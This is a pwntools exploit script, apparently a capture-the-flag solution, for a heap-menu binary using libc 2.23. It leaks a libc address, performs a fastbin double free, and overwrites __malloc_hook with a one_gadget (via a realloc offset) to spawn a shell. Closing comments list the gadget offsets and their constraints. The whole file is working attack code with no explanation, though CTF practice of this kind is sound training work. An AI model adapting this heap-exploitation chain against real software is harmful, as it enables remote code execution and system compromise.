from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])


io=process("./vuln")
# io=remote("node1.anna.nssctf.cn",28391)
elf=ELF("./vuln")
libc=ELF("./libc-2.23.so")


def add(n,s,cc):
    io.sendlineafter(b">",b"1")
    io.sendlineafter(b"Index: ",str(n))
    io.sendlineafter(b"Size: ",str(s))
    io.sendafter(b"Content: ",cc)
    
def delete(n):
    io.sendlineafter(b">",b"2")
    io.sendlineafter(b"Index: ",str(n))
    
def show(n):
    io.sendlineafter(b">",b"3")
    io.sendlineafter(b"Index: ",str(n))
    
add(0,0x60,b"qqq") #0
add(1,0x60,b"www") #1
add(2,0x80,b"eee") #2
add(3,0x10,b"rrr") #3

delete(2)
add(4,0x80,b"A"*7+b"b") #4
show(4)
#0,1,4,3
io.recvuntil(b"b")
libc_addr=u64(io.recv(6).ljust(8,b"\x00"))-0x58-0x3C4B20
print("libc_addr: "+hex(libc_addr))
malloc_hook=libc_addr+libc.sym[b"__malloc_hook"]
realloc=libc_addr+libc.sym[b"__libc_realloc"]
one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]
shell=libc_addr+one_gadget[3]

# gdb.attach(io)
# pause()

delete(0)
delete(1)
delete(0) #0->1->0

add(5,0x60,p64(malloc_hook-0x23))
add(6,0x60,b"aaa")
add(7,0x60,b"qqq")
add(8,0x60,cyclic(0xb)+p64(shell)+p64(realloc+0x6))


io.sendlineafter(b">",b"1")
io.sendlineafter(b"Index: ",b"9")
io.sendlineafter(b"Size: ",str(0x60))

io.interactive()




# 0x45226 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
